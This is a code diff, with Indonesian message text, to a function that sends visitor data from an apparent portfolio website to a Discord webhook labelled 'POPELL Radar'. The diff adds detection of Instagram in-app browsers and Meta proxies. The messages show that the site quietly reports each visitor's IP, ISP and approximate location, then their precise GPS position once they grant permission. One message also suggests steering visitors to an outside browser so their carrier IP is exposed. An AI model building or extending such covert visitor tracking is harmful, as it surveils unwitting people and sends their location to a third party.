@@ -267,6 +267,7 @@ async function sendToDiscord(webhookUrl: string, info: VisitorInfo, isGpsUpdate 
       : 'Tidak tersedia';
 
     const isGps = info.locationType === 'GPS Real (Satelit Perangkat)';
+    const isMetaProxy = /facebook|meta platforms/i.test(info.isp) || /instagram/i.test(navigator.userAgent);
 
     const payload = {
       username: 'POPELL Radar',
@@ -280,7 +281,9 @@ async function sendToDiscord(webhookUrl: string, info: VisitorInfo, isGpsUpdate 
               : 'Pengunjung Baru Terdeteksi (Gateway Operator/ISP)',
           description: isGps
             ? 'Titik fisik riil perangkat pengunjung berhasil diperoleh melalui sensor GPS satelit HP / browser.'
-            : 'Pengunjung baru saja membuka portfolio. Lokasi di bawah adalah pusat gateway server operator seluler (CGNAT). Menunggu izin sensor GPS...',
+            : isMetaProxy
+              ? 'Pengunjung membuka link langsung dari dalam aplikasi Instagram di iPhone! Meta/Instagram menyamarkan koneksi melalui proxy internal mereka.'
+              : 'Pengunjung baru saja membuka portfolio. Lokasi di bawah adalah pusat gateway server operator seluler (CGNAT). Menunggu izin sensor GPS...',
           color: isGps ? 0x10b981 : 0x2563eb,
           fields: [
             {
@@ -333,7 +336,9 @@ async function sendToDiscord(webhookUrl: string, info: VisitorInfo, isGpsUpdate 
                   {
                     name: 'Keterangan Akurasi',
                     value:
-                      'IP kuota data kartu SIM (Telkomsel, Indosat, XL, Biznet) dialihkan melalui data center gateway Jakarta/Tangerang. Begitu pengunjung menyentuh/scroll layar dan memilih "Izinkan Lokasi", posisi fisik asli akan otomatis ter-update di Discord.',
+                      isMetaProxy
+                      ? 'Pengunjung membuka link melalui Instagram In-App Browser di iPhone. Instagram merutekan koneksi lewat proxy server Meta (Springfield, AS). Untuk melihat IP provider kartu SIM langsung, buka via browser luar (misal Chrome / Safari langsung).'
+                      : 'IP kuota data kartu SIM dialihkan melalui data center gateway operator seluler. Begitu pengunjung memilih "Izinkan Lokasi", posisi fisik satelit akan otomatis ter-update di Discord.',
                     inline: false,
                   },
                 ]
